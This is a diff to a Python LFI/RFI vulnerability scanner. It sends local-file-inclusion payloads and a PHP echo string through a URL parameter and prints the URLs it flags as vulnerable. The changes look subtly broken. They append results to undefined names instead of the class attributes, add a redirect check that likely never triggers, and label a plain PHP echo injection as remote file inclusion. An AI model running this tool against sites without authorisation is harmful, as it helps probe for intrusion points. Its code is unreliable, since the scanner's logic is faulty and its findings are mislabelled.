@@ -82,24 +82,47 @@ class LFIandRFITester:
 
     def test_lfi(self, url):
         for payload in lfi_payloads:
-            target_url = f"{url}?{self.parameter}={payload}"
-            response = requests.get(target_url, verify=False, timeout=10)
-            if response.status_code == 200:
-                if "Invalid input" in response.text or payload not in response.text:
-                    continue  # Skip if not vulnerable or contains "Invalid input"
-                self.lfi_vulnerabilities.append((url, payload))
-                print(f"LFI vulnerability found in URL: {target_url}")
+            try:
+                target_url = f"http://{url}?{self.parameter}={payload}"
+                
+                # Make a HEAD request to check for redirection
+                response = requests.head(target_url, verify=False, timeout=10)
+                
+                # Check if the final URL is different
+                final_url = response.url
+                if final_url != target_url:
+                    continue  # Skip to the next URL
+
+                # Proceed with the request as before
+                response = requests.get(target_url, verify=False, timeout=10)
+
+                if response.status_code == 200 and payload in response.text:
+                    lfi_vulnerabilities.append((url, payload))
+                    print(f"LFI vulnerability found in URL: {target_url}")
+            except requests.exceptions.RequestException:
+                pass  # Error occurred, skip this URL
 
     def test_rfi(self, url):
         rfi_payload = "<?php echo 'RFI Vulnerable'; ?>"
-        full_url = f"http://{url}?{self.parameter}={rfi_payload}"
-        response = requests.get(full_url)
-        if rfi_payload in response.text:
-            self.rfi_vulnerabilities.append((url, rfi_payload))
-            print(f"RFI vulnerability found in URL: {full_url}")
+        try:
+            full_url = f"http://{url}?{self.parameter}={rfi_payload}"
+            
+            # Make a HEAD request to check for redirection
+            response = requests.head(full_url, verify=False, timeout=10)
+            
+            # Check if the final URL is different
+            final_url = response.url
+            if final_url != full_url:
+                return  # Skip this URL
+            
+            # Proceed with the request as before
+            response = requests.get(full_url, verify=False, timeout=10)
 
-# Create an instance of LFIandRFITester
-#tester = LFIandRFITester(parameter)
+            if rfi_payload in response.text:
+                rfi_vulnerabilities.append((url, rfi_payload))
+                print(f"RFI vulnerability found in URL: {full_url}")
+        except requests.exceptions.RequestException:
+            pass  # Error occurred, skip this URL
 
 def scan_urls_for_lfi(url, parameter):
     if url in processed_urls:
